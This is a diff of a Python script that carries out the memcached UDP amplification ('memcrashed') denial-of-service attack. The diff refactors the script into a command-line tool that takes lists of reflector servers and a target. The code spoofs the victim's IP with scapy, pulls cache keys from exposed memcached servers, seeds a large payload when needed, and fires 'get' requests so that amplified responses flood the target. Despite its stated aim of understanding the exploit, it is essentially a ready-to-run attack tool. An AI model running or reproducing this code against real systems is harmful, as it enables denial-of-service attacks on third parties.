@@ -1,3 +1,4 @@
+"""
 # Written by Alex Conrey
 #
 # This program is free software: you can redistribute it and/or modify
@@ -13,47 +14,40 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
-# This was created to better understand the memcrashed exploit 
+# This was created to better understand the memcrashed exploit
 # brought to light thanks to CloudFlare.
 # (https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)
 #
 # Please sysadmin responsibly.
+"""
 
+import re
+import sys
+import argparse
 import requests
 import memcache
-import re
 
-from scapy.all import *
+from scapy.layers.inet import IP, UDP
 
-# Vulnerable memcached server list
-SERVER_LIST = [
-        '172.17.0.2:11211',
-]
+from scapy.all import sr1
 
-# Destination 
-TARGET = '1.2.3.4'
+def work_magic(server, target):
+    """Function to perform payload 'offload'
+    from vulnerable memcached server"""
 
-# optional payload to set if no keys exist
-payload = requests.get('https://google.com').text
-payload_key = 'fuckit'
+    # optional payload to set if no keys exist
+    payload = requests.get('https://google.com').text
+    payload_key = 'fuckit'
 
-# this forces payload to load into memory for being extra-evil and efficient
-if not payload:
-    print 'Could not import payload, continuing anyway'
-
-try:
-    for server in SERVER_LIST:
-        if ':' in server:
-            server = server.split(':')[0]
-
-        ip = IP(src=TARGET, dst=server)
+    try:
+        ip_packet = IP(src=target, dst=server)
         packet_base = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'
 
         # fetch known keys by id
         statitems_packet = packet_base.format('stats items')
         udp = UDP(sport=50000, dport=11211)/statitems_packet
         keyids = []
-        resp = sr1(ip/udp)
+        resp = sr1(ip_packet/udp)
         for key in str(resp.payload).split('\r\n'):
             # Skip first line which has hex in it (I'm lazy)
             if 'age' in key:
@@ -63,28 +57,67 @@ try:
         # fetch names for keys by id
         keys = []
         for kid in keyids:
-            query = 'stats cachedump {0} 100'.format(kid)
-            keyid_packet = packet_base.format(query)
+            keyid_packet = packet_base.format('stats cachedump {0} 100'.format(kid))
             udp = UDP(sport=50000, dport=11211)/keyid_packet
-            resp = str(sr1(ip/udp).payload).split('\r\n')
+            resp = str(sr1(ip_packet/udp).payload).split('\r\n')
             for key in resp:
                 if 'ITEM' in key:
-                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)",key)
+                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
                     keys.append(res.group('keyname'))
 
         # if keys not present on target, make one
         if not keys:
-            mc = memcache.Client([server],debug=False)
-            mc.set(payload_key, payload)
+            memcache.Client([server], debug=False).set(payload_key, payload)
             keys.append(payload_key)
 
         # iterate thru known keys and blast away
         for key in keys:
-            query = 'get {0}'.format(key)
-            fun_packet = packet_base.format(query)
+            fun_packet = packet_base.format('get {0}'.format(key))
             udp = UDP(sport=50000, dport=11211)/fun_packet
-            sr1(ip/udp)
+            sr1(ip_packet/udp)
 
-except Exception:
-    raise
+        return True
+    except Exception as err:
+        print str(err)
+        return False
 
+
+def main():
+    """Main function"""
+    parser = argparse.ArgumentParser()
+
+    server_help = 'List of servers to utilize (space separated)'
+    list_help = 'File path to list of servers (newline separated)'
+    target_help = 'Target to test'
+
+    parser.add_argument('-s', '--servers', nargs="+", help=server_help)
+    parser.add_argument('-l', '--list', help=list_help)
+    parser.add_argument('-t', '--target', required=True, help=target_help)
+    args = parser.parse_args()
+
+    if not args.servers and not args.list:
+        print 'Please specify a list of servers or a file containing a list of servers'
+        sys.exit(1)
+
+    if args.servers and args.list:
+        print 'Please only specify a file or cmd list of servers'
+        sys.exit(1)
+
+    if args.servers:
+        server_list = args.servers
+
+    if args.list:
+        server_list = []
+        with open(args.list, 'r') as list_in:
+            for server in list_in:
+                server_list.append(server.rstrip('\n'))
+
+    try:
+        for server in server_list:
+            work_magic(server, args.target)
+    except Exception as err:
+        print str(err)
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
